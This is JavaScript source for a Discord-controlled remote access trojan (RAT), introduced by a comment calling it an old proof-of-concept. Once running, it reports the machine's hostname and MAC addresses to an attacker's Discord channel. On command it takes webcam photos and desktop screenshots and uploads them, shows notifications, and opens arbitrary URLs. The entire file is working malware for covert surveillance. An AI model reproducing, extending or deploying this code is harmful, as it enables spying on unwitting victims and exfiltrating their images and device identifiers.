/*
This code is really old and really bad.
It was a quick testing script I made when learning JavaScript.
It is only a proof-of-concept and shouldn't be used in production.
*/

const opn = require('opn');
const os = require('os');
const Discord = require('discord.js');
const notifier = require('node-notifier');
const NodeWebcam = require( "node-webcam" );
const screenshot = require('desktop-screenshot');

const token = "BOT_TOKEN"; //Your bot token
const prefix = ";"; //your command prefix
const commandChannelID = "CHANNEL_ID"; //This is the channel the rat will report to when it connects.

var ethernetMac = "Not Available!";
var wifiMac = "Not Available!";
var cmdChannel;

if(os.networkInterfaces().Ethernet) {
    ethernetMac = os.networkInterfaces().Ethernet[0].mac;
} 

if(os.networkInterfaces()['Wi-Fi']) {
    wifiMac = os.networkInterfaces()['Wi-Fi'][0].mac;
}

const bot = new Discord.Client();

bot.on("ready", () => {
    console.log("RAT is running...");
    cmdChannel = bot.channels.get(commandChannelID);

    cmdChannel.send(`**Bot connected!**\nHostname: ${os.hostname()}\nWi-Fi MAC: ${wifiMac}\nEthernet MAC: ${ethernetMac}`);
})

bot.on("message", (message) => {

    if(message.author.bbot) return;

    if(message.channel.type == "dm") return;

    if(!message.content.startsWith(prefix)) return;

    const args = message.content.slice(prefix.length).trim().split(/ +/g);
    const command = args.shift().toLowerCase();

    if(args[0] !== os.hostname()) return;

    if(command == "say") {

        var message = args.slice(1).join(" ");

        notifier.notify({
            title: 'Message',
            message: message
        });
    }

    if(command == "capture") {
        var opts = {
            width: 1280,
            height: 720,
            quality: 100,
            delay: 0,
            saveShots: true,
            output: "jpeg",
            device: false,
            callbackReturn: "location",
            verbose: false
        };

        var Webcam = NodeWebcam.create(opts);
        var date = new Date();
        var hour = date.getHours();
        var min = date.getMinutes();
        var pictureName = `${hour}:${min}`;

        Webcam.capture(`${pictureName}.png`, function(error, data ) {
            
            message.channel.send({files: [{
                attachment: `./${pictureName}.png`,
                name: `${pictureName}.png`
            }]})
        });
    }

    if(command == "screenshot") {

        var date = new Date();
        var hour = date.getHours();
        var min = date.getMinutes();
        var pictureName = `${hour}:${min}`;

        screenshot(`${pictureName}.png`, function(error, done) {
            if(error) {
                message.channel.send(`Error while taking screenshot: ${error}`);
            }

            if(done) {
                message.channel.send({files: [{
                    attachment: `./${pictureName}.png`,
                    name: `${pictureName}.png`
                }]})
            }
        });
    }

    if(command == "url") {
        var url = args[1];

        if(!url || url.length <= 0 || !url.startsWith("http")) {
            message.channel.send("Specify a valid URL");
            return;
        }

        opn(url);
        message.channel.send("URL opened in default browser.");
    }
})

bot.login(token);
